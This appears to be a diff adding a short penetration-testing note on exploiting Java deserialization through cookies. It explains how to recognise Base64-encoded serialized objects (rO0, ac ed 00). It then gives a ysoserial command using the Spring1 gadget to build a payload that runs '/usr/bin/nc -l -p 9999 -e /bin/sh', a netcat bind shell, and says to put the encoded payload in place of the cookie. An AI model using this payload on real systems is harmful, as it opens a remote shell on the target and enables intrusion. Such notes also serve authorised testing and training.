@@ -1,0 +1,14 @@
+Java Serialized Object:
+
+This exploits the method readObject() on data coming from the user
+
+if cookie value starts with rO0 there is a good chance the cookie is Base64 encoded java serialized object
+
+Send value to Decoded and Base64 decode it. In the Hex view does is start with ac ed 00? If so, good 
+indication of a serialized object.
+
+
+java -jar ysoserial-master-30099844c6-1.jar Spring1 '/usr/bin/nc -l -p 9999 -e /bin/sh' |base64		#(|base64 -w 0 on linux)
+	Spring1 is the Gadget type. Maybe possible gadget types. Try all of them.
+
+Copy the Base64 encoded value and replace the cookie value with it.
